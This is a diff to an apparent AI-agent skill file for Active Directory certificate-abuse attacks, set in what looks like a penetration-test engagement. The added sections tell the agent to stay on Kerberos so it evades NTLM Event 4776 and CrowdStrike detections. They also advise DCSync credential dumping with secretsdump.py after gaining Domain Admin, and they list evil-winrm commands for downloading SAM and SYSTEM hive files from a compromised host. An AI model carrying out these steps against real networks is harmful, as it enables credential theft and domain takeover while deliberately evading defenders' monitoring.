@@ -98,6 +98,34 @@ mv $TMPDIR/administrator.pfx engagement/evidence/administrator.pfx
 mv $TMPDIR/administrator.ccache engagement/evidence/administrator.ccache
 ```
 
+## Clock Skew Interrupt
+
+**Before any Kerberos operation**, check for clock skew. If you encounter
+`KRB_AP_ERR_SKEW` at any point during this skill — **STOP IMMEDIATELY**.
+
+Do NOT fall back to NTLM authentication. Kerberos-first is an OPSEC
+requirement, not a preference. NTLM fallback generates Event 4776 and
+CrowdStrike Identity Module PTH signatures — the exact detections
+Kerberos-first exists to avoid.
+
+**When clock skew is detected:**
+
+1. Note the skew magnitude (from the error or `ntpdate -q DC_IP`)
+2. **STOP. Return to the orchestrator** with this structured interrupt:
+
+```
+### Clock Skew Interrupt
+- Error: KRB_AP_ERR_SKEW
+- Skew: <magnitude in seconds/minutes>
+- DC IP: <IP>
+- Stage: <what step you were on when it hit>
+- Attempted: <commands that failed>
+```
+
+The orchestrator will handle clock sync (requires sudo) and re-invoke
+this skill with identical parameters. Do not retry, do not work around
+it with NTLM, do not write your own sync script.
+
 ## Step 1: Enumerate Vulnerable Templates
 
 Run ADCS enumeration to identify vulnerable templates. If the orchestrator or
@@ -414,7 +442,11 @@ certipy cert -export -pfx cert.pfx -password 'old-pass' -out unprotected.pfx
 
 After obtaining a certificate and authenticating:
 
-- **Domain Admin obtained**: Route to **credential-dumping** for DCSync
+- **Domain Admin obtained**: Route to **credential-dumping** for DCSync.
+  **Prefer DRSUAPI** (`secretsdump.py -just-dc-ntlm`) over SAM/SYSTEM hive
+  export — DRSUAPI is faster, doesn't require file transfer, and avoids
+  the slow evil-winrm download path for large hive files (~34MB system.hive
+  takes minutes via WinRM download vs seconds via DRSUAPI over the network).
 - **High-priv user obtained**: Check group memberships, route to further targets
 - **Machine account obtained**: Use S4U2Self for service tickets, route to
   **kerberos-delegation** if delegation configured
@@ -423,6 +455,23 @@ After obtaining a certificate and authenticating:
   account persistence via certificate mapping
 - **Found template ACL issues**: Route to **adcs-access-and-relay** (ESC4)
 - **Found weak certificate mapping**: Route to **adcs-persistence** (ESC9/10)
+
+### Evil-WinRM file transfer notes
+
+When downloading files via evil-winrm through shell-server, use the relative
+path syntax after `cd` to the directory:
+
+```bash
+# Reliable: cd to directory, then download with relative path
+cd C:\Windows\Temp
+download sam.hive /tmp/claude-1000/sam.hive
+
+# Unreliable: absolute paths may fail silently or cause path parsing issues
+download C:\Windows\Temp\sam.hive /tmp/claude-1000/sam.hive  # may fail
+```
+
+For large files (>5MB), prefer network-based transfer (DRSUAPI, SMB, SCP)
+over evil-winrm download to avoid long polling loops.
 
 ## Stall Detection
 
@@ -490,14 +539,8 @@ permissions to approve it yourself — route to **adcs-access-and-relay** (ESC7)
 
 ### KRB_AP_ERR_SKEW (Clock Skew)
 
-Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
-Interrupt** — stop immediately and return to the orchestrator. Do not retry or
-fall back to NTLM. The fix requires root:
-```bash
-sudo ntpdate DC_IP
-# or
-sudo rdate -n DC_IP
-```
+See **Clock Skew Interrupt** section above. STOP and return to the orchestrator.
+Do not retry, do not fall back to NTLM.
 
 ### OPSEC comparison
 
